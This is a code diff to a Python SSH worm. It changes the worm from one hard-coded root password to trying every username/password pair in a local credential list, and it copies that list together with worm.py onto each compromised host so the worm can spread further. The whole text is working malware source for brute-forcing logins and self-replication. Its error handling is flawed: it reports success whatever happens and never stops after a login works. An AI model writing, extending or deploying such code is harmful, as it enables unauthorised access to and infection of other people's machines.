@@ -38,10 +38,13 @@ class Worm:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-        try:
-            ssh.connect(ip, username='root', password='toor')
-        except paramiko.AuthenticationException:
-            print('Failed to ssh to root@{}'.format(ip))
+        with open('./list', 'r') as f:
+            for line in f:
+                user_pwd = line.strip().split()
+                try:
+                    ssh.connect(ip, username=user_pwd[0], password=user_pwd[1])
+                except paramiko.AuthenticationException:
+                    print('Failed to ssh to root@{}'.format(ip))
 
         print('Successfully ssh to root@{}'.format(ip))
         self.replicate(ssh)
@@ -53,6 +56,7 @@ class Worm:
             print('This server has already been infectd...')
         except IOError:
             sftp_client.put('worm.py', './tmp/worm.py')
+            sftp_client.put('list', './tmp/list')
 
 
 
